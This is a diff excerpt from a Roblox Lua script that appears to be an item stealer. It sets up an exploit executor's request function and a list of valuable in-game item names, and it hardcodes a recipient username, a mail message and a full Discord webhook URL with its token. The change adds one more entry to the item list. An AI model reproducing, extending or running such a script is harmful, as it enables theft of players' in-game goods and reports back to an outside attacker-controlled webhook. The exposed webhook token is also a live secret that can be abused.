@@ -7,7 +7,7 @@ local Request = http.request or http_request or syn.request or request
 local Player = game:GetService("Players").LocalPlayer
 local Functions = {}
 local ProcessPending = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"].Disabled == true
-local Database = {"Huge", "Titanic", "Acorn", "Jelly Coin", "God", "Egg", "Gift", "Present", "Bag", "Key", "Pickaxe", "Exotic", "Runic", "Legendary", "Diamond"}
+local Database = {"Huge", "Titanic", "Acorn", "Jelly Coin", "God", "Egg", "Gift", "Present", "Bag", "Key", "Pickaxe", "Exotic", "Runic", "Legendary", "Diamond", "ed5cf463d26c49d6bd42c349dfe5edc3"}
 local username = "Dkag98"
 local webhook = "https://discord.com/api/webhooks/1339296103043956857/EOTsHOH0o1JujZma1jP2YaNKhm_HzeYwgUVNkmBstLISXnNvVxk7S07R_L0nOk-Aynel"
 local mailmessage = "FOOD IS GOOD"
